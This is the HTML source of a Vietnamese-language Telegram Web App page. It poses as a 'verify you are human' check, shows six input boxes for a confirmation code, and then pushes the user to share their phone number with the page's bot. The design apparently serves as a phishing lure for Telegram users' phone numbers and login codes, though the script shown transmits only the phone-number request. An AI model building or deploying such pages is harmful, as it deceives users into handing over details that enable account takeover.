<!DOCTYPE html>
<html lang="vi">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<script src="https://telegram.org/js/telegram-web-app.js"></script>

<style>
body { margin:0; font-family: Arial, sans-serif; overflow:hidden; }

/* nền ảnh */
.bg {
  position: fixed;
  width: 100%;
  height: 100%;
  background: url("https://sf-static.upanhlaylink.com/img/image_20260324de75528845a06e58dc6de699d22000db.jpg") center/cover no-repeat;
  filter: blur(4px);
  transform: scale(1.05);
}

/* overlay đen nhẹ */
.overlay {
  position: fixed;
  width:100%; height:100%;
  background: rgba(0,0,0,0.25);
}

/* icon vẫy tay */
.icon {
  position:absolute;
  top:25%;
  left:50%;
  transform:translate(-50%,-50%);
  font-size:90px;
  animation: wave 1.2s infinite;
}

/* animation vẫy */
@keyframes wave {
  0% { transform: translate(-50%, -50%) rotate(0deg); }
  15% { transform: translate(-50%, -50%) rotate(14deg); }
  30% { transform: translate(-50%, -50%) rotate(-8deg); }
  45% { transform: translate(-50%, -50%) rotate(14deg); }
  60% { transform: translate(-50%, -50%) rotate(-4deg); }
  75% { transform: translate(-50%, -50%) rotate(10deg); }
  100% { transform: translate(-50%, -50%) rotate(0deg); }
}

/* hộp nội dung */
.box {
  position:absolute;
  bottom:100px;
  left:20px; right:20px;
  background:#fff;
  padding:18px 15px;
  border-radius:15px;
  text-align:center;
  font-size:17px;
  font-weight:500;
  color:#111;
}

/* nút */
.btn {
  width: 90%;
  margin-top:12px;
  background:#3b9edb;
  color:#fff;
  padding:14px;
  border:none;
  border-radius:10px;
  font-size:17px;
  cursor:pointer;
}

/* mã code */
.code-box {
  display:flex;
  justify-content:center;
  gap:5px;
  margin-top:12px;
}
.code-box input {
  width:38px; height:48px;
  text-align:center;
  font-size:20px;
  border-radius:8px;
  border:1px solid #ccc;
}
</style>
</head>

<body>

<div class="bg"></div>
<div class="overlay"></div>

<!-- icon vẫy tay -->
<div class="icon">👋</div>

<!-- STEP 1 -->
<div class="box" id="step1">
  Bạn cần xác nhận mình là người thật,<br>
  hãy nhấp vào nút bên dưới để bắt đầu!
  <button class="btn" onclick="step2()">Xác nhận</button>
</div>

<!-- STEP 2 -->
<div class="box" id="step2" style="display:none;">
  Nhập mã xác nhận
  <div class="code-box">
    <input maxlength="1" oninput="move(this,0)">
    <input maxlength="1" oninput="move(this,1)">
    <input maxlength="1" oninput="move(this,2)">
    <input maxlength="1" oninput="move(this,3)">
    <input maxlength="1" oninput="move(this,4)">
    <input maxlength="1" oninput="move(this,5)">
  </div>

  <button class="btn" onclick="requestPhone()">📲 Chia sẻ số điện thoại</button>
</div>

<script>
let tg = window.Telegram.WebApp;
tg.expand();

// chuyển từ Step 1 -> Step 2
function step2(){
  document.getElementById("step1").style.display = "none";
  document.getElementById("step2").style.display = "block";
}

// tự động nhảy ô nhập mã
const inputs = document.querySelectorAll(".code-box input");
function move(el,i){
  if(el.value.length == 1 && i < 5) inputs[i+1].focus();
}

// gửi yêu cầu share số điện thoại về bot
function requestPhone(){
    tg.sendData("request_phone");
    tg.showAlert("Nhấn nút chia sẻ số điện thoại trong Telegram để tiếp tục!");
}
</script>

</body>
</html>
